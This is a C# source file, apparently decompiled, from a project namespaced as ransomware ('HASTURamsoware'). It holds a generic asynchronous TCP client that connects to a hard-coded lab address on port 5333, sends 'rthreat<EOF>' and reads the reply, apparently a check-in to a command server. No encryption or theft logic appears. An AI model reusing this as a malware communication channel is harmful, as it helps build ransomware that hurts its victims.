using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace HASTURamsoware;

public class AsynchronousClient
{
	private const int port = 5333;

	private static ManualResetEvent connectDone = new ManualResetEvent(initialState: false);

	private static ManualResetEvent sendDone = new ManualResetEvent(initialState: false);

	private static ManualResetEvent receiveDone = new ManualResetEvent(initialState: false);

	private static string response = string.Empty;

	public static void StartClient()
	{
		try
		{
			IPHostEntry hostEntry = Dns.GetHostEntry("192.168.249.129");
			IPAddress iPAddress = hostEntry.AddressList[0];
			IPEndPoint remoteEP = new IPEndPoint(iPAddress, 5333);
			Socket socket = new Socket(iPAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
			socket.BeginConnect(remoteEP, ConnectCallback, socket);
			connectDone.WaitOne();
			Send(socket, "rthreat<EOF>");
			sendDone.WaitOne();
			Receive(socket);
			receiveDone.WaitOne();
			Console.WriteLine("Response received : {0}", response);
			socket.Shutdown(SocketShutdown.Both);
			socket.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
		}
		Console.ReadLine();
	}

	private static void ConnectCallback(IAsyncResult ar)
	{
		try
		{
			Socket socket = (Socket)ar.AsyncState;
			socket.EndConnect(ar);
			Console.WriteLine("Socket connected to {0}", socket.RemoteEndPoint!.ToString());
			connectDone.Set();
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
		}
	}

	private static void Receive(Socket client)
	{
		try
		{
			StateObject stateObject = new StateObject();
			stateObject.workSocket = client;
			client.BeginReceive(stateObject.buffer, 0, 256, SocketFlags.None, ReceiveCallback, stateObject);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
		}
	}

	private static void ReceiveCallback(IAsyncResult ar)
	{
		try
		{
			StateObject stateObject = (StateObject)ar.AsyncState;
			Socket workSocket = stateObject.workSocket;
			int num = workSocket.EndReceive(ar);
			if (num > 0)
			{
				stateObject.sb.Append(Encoding.ASCII.GetString(stateObject.buffer, 0, num));
				workSocket.BeginReceive(stateObject.buffer, 0, 256, SocketFlags.None, ReceiveCallback, stateObject);
				return;
			}
			if (stateObject.sb.Length > 1)
			{
				response = stateObject.sb.ToString();
			}
			receiveDone.Set();
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
		}
	}

	private static void Send(Socket client, string data)
	{
		byte[] bytes = Encoding.ASCII.GetBytes(data);
		client.BeginSend(bytes, 0, bytes.Length, SocketFlags.None, SendCallback, client);
	}

	private static void SendCallback(IAsyncResult ar)
	{
		try
		{
			Socket socket = (Socket)ar.AsyncState;
			int num = socket.EndSend(ar);
			Console.WriteLine("Sent {0} bytes to server.", num);
			sendDone.Set();
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
		}
	}
}
